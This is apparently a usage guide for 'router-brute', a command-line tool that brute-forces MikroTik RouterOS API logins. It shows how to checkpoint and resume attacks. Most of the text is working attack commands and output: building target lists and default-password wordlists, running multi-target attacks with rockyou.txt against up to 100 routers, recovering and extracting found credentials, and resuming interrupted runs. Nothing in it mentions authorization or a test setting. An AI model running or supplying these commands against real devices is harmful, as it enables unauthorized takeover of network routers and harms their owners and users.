# Resume Functionality Example

This example demonstrates the save/resume functionality in action.

## Setup

Create test files:

```bash
# Create targets file
cat > targets.txt <<EOF
192.168.1.1:8728 admin
192.168.1.2:8728 admin
192.168.1.3:8728 admin
EOF

# Create password list
cat > passwords.txt <<EOF
admin
password
12345
admin123
password123
root
mikrotik
routeros
EOF
```

## Example 1: Basic Save and Resume

### Step 1: Start Attack with Auto-Save

```bash
./router-brute mikrotik-v6 \
  --target-file targets.txt \
  --wordlist passwords.txt \
  --workers 2 \
  --concurrent-targets 1 \
  --save-progress 10s \
  --save-dir ./resume
```

**Output:**
```
{"level":"info","message":"Progress auto-save enabled","interval":"10s","directory":"./resume"}
{"level":"info","message":"Starting multi-target attack","protocol":"mikrotik-v6","targets":3}
{"level":"info","message":"Starting attack on target","target":"192.168.1.1","port":8728}
{"level":"info","message":"Connection test successful","target":"192.168.1.1"}
...
{"level":"info","message":"Saved resume state","file":"./resume/resume_20260105_150430.json"}
...
```

### Step 2: Interrupt (Ctrl+C)

After a few saves, press Ctrl+C to interrupt:

```
^C
{"level":"info","message":"Saved resume state","file":"./resume/resume_20260105_150510.json"}
```

### Step 3: Check Resume Files

```bash
ls -lh ./resume/
```

**Output:**
```
-rw-r--r-- 1 user user  1.2K Jan  5 15:04 resume_20260105_150430.json
-rw-r--r-- 1 user user  1.3K Jan  5 15:04 resume_20260105_150440.json
-rw-r--r-- 1 user user  1.4K Jan  5 15:05 resume_20260105_150510.json
```

### Step 4: Resume from Latest

```bash
./router-brute mikrotik-v6 \
  --resume ./resume/resume_20260105_150510.json
```

**Output:**
```
{"level":"info","message":"Resuming from previous session","file":"./resume/resume_20260105_150510.json"}

=== Resume State Summary ===
Timestamp:     2026-01-05 15:05:10
Protocol:      mikrotik-v6
Username:      admin
Password File: /path/to/passwords.txt
Target File:   /path/to/targets.txt
Workers:       2
Rate Limit:    100ms

Progress:      1/3 targets completed (0 successful)

Remaining targets: 2
  192.168.1.2:8728 (4 passwords tried)
  192.168.1.3:8728 (0 passwords tried)
=============================

{"level":"info","message":"Resuming from previous progress","target":"192.168.1.2","resume_from":4}
{"level":"debug","message":"Password list adjusted for resume","skipped":4,"remaining":4}
...
```

## Example 2: Inspect Resume File

View the resume file content:

```bash
cat ./resume/resume_20260105_150510.json | jq .
```

**Output:**
```json
{
  "timestamp": "2026-01-05T15:05:10Z",
  "protocol": "mikrotik-v6",
  "username": "admin",
  "password_file": "/home/user/passwords.txt",
  "target_file": "/home/user/targets.txt",
  "workers": 2,
  "rate_limit": "100ms",
  "targets": [
    {
      "ip": "192.168.1.1",
      "port": 8728,
      "username": "admin",
      "passwords_tried": 8,
      "completed": true,
      "success": false
    },
    {
      "ip": "192.168.1.2",
      "port": 8728,
      "username": "admin",
      "passwords_tried": 4,
      "completed": false,
      "success": false
    },
    {
      "ip": "192.168.1.3",
      "port": 8728,
      "username": "admin",
      "passwords_tried": 0,
      "completed": false,
      "success": false
    }
  ]
}
```

## Example 3: Successful Attack with Resume

### Step 1: Start Attack

```bash
./router-brute mikrotik-v6 \
  --target-file targets.txt \
  --wordlist passwords.txt \
  --save-progress 5s
```

### Step 2: One Target Succeeds

```
{"level":"info","message":"✓ Found valid credentials","target":"192.168.1.2","username":"admin","password":"admin123"}
{"level":"info","message":"Saved resume state","file":"./resume/resume_20260105_151200.json"}
```

### Step 3: Inspect Resume

```bash
cat ./resume/resume_20260105_151200.json | jq '.targets[] | select(.success==true)'
```

**Output:**
```json
{
  "ip": "192.168.1.2",
  "port": 8728,
  "username": "admin",
  "passwords_tried": 4,
  "completed": true,
  "success": true,
  "found_password": "admin123"
}
```

### Step 4: Resume (Skips Successful Target)

```bash
./router-brute mikrotik-v6 \
  --resume ./resume/resume_20260105_151200.json
```

**Output:**
```
=== Resume State Summary ===
...
Progress:      1/3 targets completed (1 successful)

Successful credentials:
  192.168.1.2:8728 - admin:admin123

Remaining targets: 2
  192.168.1.1:8728 (2 passwords tried)
  192.168.1.3:8728 (0 passwords tried)
=============================

{"level":"info","message":"Target already completed, skipping","target":"192.168.1.2","success":true}
{"level":"info","message":"Starting attack on target","target":"192.168.1.1"}
...
```

## Example 4: Custom Save Interval

### Frequent Saves (Testing)

```bash
./router-brute mikrotik-v6 \
  --target-file targets.txt \
  --wordlist passwords.txt \
  --save-progress 5s  # Save every 5 seconds
```

### Infrequent Saves (Production)

```bash
./router-brute mikrotik-v6 \
  --target-file targets.txt \
  --wordlist large-wordlist.txt \
  --save-progress 5m  # Save every 5 minutes
```

### Disable Auto-Save

```bash
./router-brute mikrotik-v6 \
  --target-file targets.txt \
  --wordlist passwords.txt \
  --save-progress 0  # Disabled
```

## Example 5: Long-Running Attack Workflow

Realistic scenario with large wordlist and many targets:

```bash
# Create large target list
cat targets-large.txt
# (Contains 100 targets)

# Start attack with reasonable save interval
./router-brute mikrotik-v6 \
  --target-file targets-large.txt \
  --wordlist rockyou.txt \
  --workers 10 \
  --concurrent-targets 5 \
  --save-progress 2m \
  --save-dir /var/lib/router-brute/resume

# Let it run for hours...
# Network interruption or Ctrl+C happens

# Resume from latest checkpoint
ls -t /var/lib/router-brute/resume/ | head -1
# resume_20260105_183042.json

./router-brute mikrotik-v6 \
  --resume /var/lib/router-brute/resume/resume_20260105_183042.json

# Attack continues from exact position
```

## Example 6: Monitoring Progress

While attack is running in another terminal:

```bash
# Watch resume files being created
watch -n 1 'ls -lh ./resume/ | tail -5'

# Monitor latest resume state
watch -n 5 'cat $(ls -t ./resume/*.json | head -1) | jq ".targets | length, map(select(.completed)) | length"'

# Get summary statistics
cat $(ls -t ./resume/*.json | head -1) | jq '{
  total: .targets | length,
  completed: .targets | map(select(.completed)) | length,
  successful: .targets | map(select(.success)) | length,
  in_progress: .targets | map(select(.completed == false)) | length
}'
```

**Output:**
```json
{
  "total": 100,
  "completed": 23,
  "successful": 5,
  "in_progress": 77
}
```

## Tips

1. **Keep Original Files**: Don't delete targets.txt or passwords.txt - resume needs them
2. **Use Absolute Paths**: Makes resume files portable
3. **Test Small First**: Test resume on small wordlists before production
4. **Backup Resume Files**: Copy important checkpoints before resuming
5. **Clean Old Files**: Delete old resume files to save space

## Troubleshooting

### "Password file not found" when resuming

Resume file stores absolute path. If you moved files:
```bash
# Edit resume file
jq '.password_file = "/new/path/passwords.txt"' resume.json > resume-fixed.json

# Or use relative path by manually editing
vim resume.json
# Change: "/old/path/passwords.txt" -> "./passwords.txt"
```

### "No progress" after resume

Check if you're resuming the latest file:
```bash
ls -lt ./resume/
# Use the most recent file
```

### Resume from specific checkpoint

```bash
# List all resume points
ls -lt ./resume/

# Pick specific one based on timestamp
./router-brute mikrotik-v6 --resume ./resume/resume_20260105_150000.json
```
